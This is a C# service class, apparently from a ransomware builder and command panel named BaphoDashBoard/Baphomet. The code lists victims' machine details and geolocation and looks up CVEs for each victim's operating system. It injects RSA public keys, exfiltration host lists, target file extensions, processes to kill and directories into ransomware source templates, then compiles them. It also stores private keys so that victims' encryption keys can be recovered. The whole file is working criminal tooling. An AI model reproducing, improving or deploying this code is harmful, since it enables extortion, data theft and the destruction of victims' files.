using BaphoDashBoard.Models;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using HtmlAgilityPack;
using ScrapySharp.Extensions;
using ScrapySharp.Network;
using BaphoDashBoard.DTO;
using BaphoDashBoard.ViewModels;
using System.IO;
using System.Collections;
using System.Diagnostics;
using Microsoft.AspNetCore.Http;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace BaphoDashBoard.DAL.Services
{
    public class ManagementService : BaseService
    {
        public ManagementService(MyLocalDatabase context) : base(context)
        {
        }
        static ScrapingBrowser _browser = new ScrapingBrowser();
        public async Task<List<Administrators>> GetAdmin()
        {
            List<Administrators> result = new List<Administrators>();

            result = _context.Administrators.Select(x => new Administrators()
            {
                Id = x.Id,
                Username = x.Username,
                Password = x.Password,
                PasswordHash = x.PasswordHash
            }).ToList();

            return result;
        }

        public async Task<List<VictimDetail>> GetRecordList()
        {
            List<VictimDetail> result = new List<VictimDetail>();
            try
            {
                result = await _context.VictimDetail.ToListAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }

        public async Task<AppResult> DeleteVictim(int id)
        {
            AppResult result = new AppResult();
            try
            {
                var record_to_delete = await _context.VictimDetail.Where(x => x.Id == id).FirstOrDefaultAsync();
                if (record_to_delete != null)
                {
                    _context.VictimDetail.Remove(record_to_delete);
                    await _context.SaveChangesAsync();
                    result.success = true;
                    result.message = "record delete";
                }
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult> DeleteRansom(int id)
        {
            AppResult result = new AppResult();
            try
            {
                var record_to_delete = await _context.Ransomware.Where(x => x.Id == id).FirstOrDefaultAsync();
                if (record_to_delete != null)
                {
                    _context.Ransomware.Remove(record_to_delete);
                    await _context.SaveChangesAsync();
                    result.success = true;
                    result.message = "record delete";
                }
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<List<RansomDetailsViewModel>> GetRansomwareDetails()
        {
            List<RansomDetailsViewModel> ransomwaredetails = new List<RansomDetailsViewModel>();
            try
            {
                ransomwaredetails = await _context.Ransomware.Select(x => new RansomDetailsViewModel()
                {
                    Id = x.Id,
                    Name = x.Name,
                    Description = x.Description,
                    Date = x.ReleaseDate.ToShortDateString()

                }).ToListAsync();
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);

            }
            return ransomwaredetails;
        }

        public async Task<DetailsViewModel> Details(int id)
        {
            DetailsViewModel victimdetails = new DetailsViewModel();
            try
            {
                victimdetails = await _context.VictimDetail.Where(x => x.Id == id).Select(s => new DetailsViewModel()
                {
                    Id = s.Id,
                    MachineName = s.MachinName,
                    Machine_OS = s.MachineOS,
                    HostName = s.Hostname,
                    Ip = s.Ip,
                    Country = s.Country,
                    City = s.City,
                    PostalCode = s.PostalCode,
                    Latitude = s.Lat,
                    Longitude = s.Lng,
                    Region = s.Region,
                }).FirstOrDefaultAsync();

                var url = "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=" + victimdetails.Machine_OS.Replace(" ", "+");
                var pagelinks = GetPageLinks(url);

                victimdetails.CveInfo = pagelinks;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            return victimdetails;
        }

        static List<NameAndValueDTO> GetPageLinks(string url)
        {
            List<NameAndValueDTO> info = new List<NameAndValueDTO>();
            var cve_info = "";
            var cve_name = "";

            var html = GetHtmlContent(url);
            var links = html.CssSelect("td");
            foreach (var link in links)
            {
                //if (link.Attributes["href"].Value.Contains("cvename"))
                //{
                //    homePageLinks.Add(link.Attributes["href"].OwnerNode.InnerHtml);
                //}

                if (link.Attributes.Contains("valign") && !link.Attributes.Contains("nowrap"))
                {
                    cve_info = link.Attributes["valign"].OwnerNode.InnerHtml;
                }
                if (link.Attributes.Contains("valign") && link.Attributes.Contains("nowrap"))
                {
                    cve_name = link.InnerText;
                }

                if(cve_name != "" && cve_info != "")
                {
                    info.Add(new NameAndValueDTO() { Title = cve_name, Description = cve_info });
                }
            }
            return info;
        }

        static HtmlNode GetHtmlContent(string url)
        {
            WebPage webpage = _browser.NavigateToPage(new Uri(url));
            return webpage.Html;
        }

        public async Task<AppResult> CreateRansomware(GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            {
                model.HostsList.AddRange(model.Hosts.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                model.ExtensionsList.AddRange(model.Extensions.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                model.ProcessesList.AddRange(model.Processes.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                model.DirsList.AddRange(model.Dirs.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());

                var rsa_keys = GenerateRsaKeys();
                model.PublicKey = rsa_keys.PublicKey;

                var edit_ransomware = await EditBaphometFiles(model);

                if(edit_ransomware.success == true)
                {

                    Ransomware ransomware = new Ransomware()
                    {
                        Name = model.Name,
                        Description = model.Description,
                        ReleaseDate = DateTime.Now,
                        PublicKey = rsa_keys.PublicKey,
                        PrivateKey = rsa_keys.PrivateKey
                    };
                     _context.Ransomware.Add(ransomware);
                      await _context.SaveChangesAsync();

                    result.message = "Your ransomare has been compiled successfully!";
                }

            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult> EditBaphometFiles(GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            { 
                var getpath = Directory.GetCurrentDirectory();
                DirectoryInfo fullpath = new DirectoryInfo(getpath);
                var main_path = fullpath.Parent.FullName;
                var output_path = Path.Combine(main_path, "Tools", "output","Baphomet");
                main_path = Path.Combine(main_path, "Tools", "Baphomet");

                DirectoryInfo sourceDir = new DirectoryInfo(main_path);
                DirectoryInfo destinationDir = new DirectoryInfo(output_path);

                CopyDirectory(sourceDir, destinationDir);
                var draw_rsa_key = await DrawParameters(Path.Combine(output_path, "Utilities"), "CryptRSA.cs", "<public key here>", model);
                var draw_host_list = await DrawParameters(Path.Combine(output_path, "Utilities"), "NetInfo.cs", "<host list here>", model);
                var draw_extensions = await DrawParameters(Path.Combine(output_path, "Utilities"), "Crypt.cs", "<extensions list here>", model);
                var draw_processes = await DrawParameters(Path.Combine(output_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
                var draw_dirs = await DrawParameters(output_path, "Program.cs", "<dirs list here>", model);

                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
                    {
                        var strCmdText = "/K cd " + output_path + " & compile.bat";
                        Process.Start("CMD.exe", strCmdText).WaitForExit();
                    }
                }

                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
                    {
                        var strCmdText = "/K cd " + output_path + " & compile.bat";
                        Process.Start("bash", strCmdText).WaitForExit();
                    }
                }
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        static void CopyDirectory(DirectoryInfo sourceDir, DirectoryInfo destinationDir)
        {
            try
            {
                if (!destinationDir.Exists)
                {
                    destinationDir.Create();
                }
                else
                {
                    Directory.Delete(destinationDir.Parent.FullName,true);
                    destinationDir.Create();
                }
                FileInfo[] files = sourceDir.GetFiles();
                foreach (FileInfo file in files)
                {
                    file.CopyTo(Path.Combine(destinationDir.FullName, file.Name));
                }
                DirectoryInfo[] dirs = sourceDir.GetDirectories();
                foreach (DirectoryInfo dir in dirs)
                {
                    string destination = Path.Combine(destinationDir.FullName, dir.Name);
                    CopyDirectory(dir, new DirectoryInfo(destination));
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public async Task<AppResult> DrawParameters(string file_path, string file, string refence_value, GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            {
                var file_location = Path.Combine(file_path, file);
                string[] file_content = File.ReadAllLines(file_location);

                switch (file)
                {
                    //Pego la llave publica que cifra la llave simetrica.
                    case "CryptRSA.cs":

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, model.PublicKey);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);
                        break;

                    //Pego la lista host a los cuales el ransomware buscara enviar la info.
                    case "NetInfo.cs":

                        var hostlist_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach(var host in model.HostsList)
                        {
                            hostlist_string = hostlist_string + '"' + host.ToString() + '"' + ',';
                        }
                        hostlist_string = hostlist_string.Remove(hostlist_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, hostlist_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);
                        break;

                    //Pego las extensiones que deseo cifrar.
                    case "Crypt.cs":
                        var extensions_list_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach (var extension in model.ExtensionsList)
                        {
                            extensions_list_string = extensions_list_string + '"' + extension.ToString() + '"' + ',';
                        }
                        extensions_list_string = extensions_list_string.Remove(extensions_list_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, extensions_list_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);

                        break;

                    //Pego los procesos que deseo matar para cifrar archivos abiertos
                    case "Diagnostics.cs":

                        var processes_list_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach (var process in model.ProcessesList)
                        {
                            processes_list_string = processes_list_string + '"' + process.ToString() + '"' + ',';
                        }
                        processes_list_string = processes_list_string.Remove(processes_list_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, processes_list_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);

                        break;
                    //Pego los directoros que el ransomware recorrera.
                    case "Program.cs":
                        var dirs_list_string = "";
                        refence_value = '"' + refence_value + '"';

                        foreach (var dir in model.DirsList)
                        {
                            dirs_list_string = dirs_list_string + '"' + dir.ToString() + '"' + ',';
                        }
                        dirs_list_string = dirs_list_string.Remove(dirs_list_string.LastIndexOf(","), ",".Length);

                        for (var i = 0; i < file_content.Length; i++)
                        {
                            if (file_content[i].Contains(refence_value))
                            {
                                file_content[i] = file_content[i].Replace(refence_value, dirs_list_string);
                            }
                        }
                        File.WriteAllLines(file_location, file_content);

                        break;
                }
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult<string>> GetSecretKey(IFormFile file)
        {
            AppResult<string> result = new AppResult<string>();
            try
            {
                var privatekey_list = await _context.Ransomware.Select(x => x.PrivateKey).ToListAsync();

                var ms = new MemoryStream();
                file.OpenReadStream().CopyTo(ms);
                byte[] dataToDecrypt = ms.ToArray();
                var get_secretkey = new AppResult<string>();
                foreach(var privatekey in privatekey_list)
                {
                    get_secretkey = RSADecrypt(dataToDecrypt, privatekey);
                    if(get_secretkey.success != false)
                    {
                        result.MRObject = get_secretkey.MRObject;
                        result.message = "key found!";
                        break;
                    }
                }

                if(get_secretkey == null)
                {
                    result.success = false;
                    result.message = "key not found";
                }
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }

            return result;
        }

        public AppResult<string> RSADecrypt(byte[] dataToDecrypt, string privatekey)
        {
            AppResult<string> result = new AppResult<string>();
            try
            {
                byte[] decryptedData;

                using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider())
                {
                    rsa.FromXmlString(privatekey);
                    decryptedData = rsa.Decrypt(dataToDecrypt, false);
                }
                UnicodeEncoding byteConverter = new UnicodeEncoding();
                var secretkey = byteConverter.GetString(decryptedData);
                result.MRObject = secretkey;
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }
    }
}
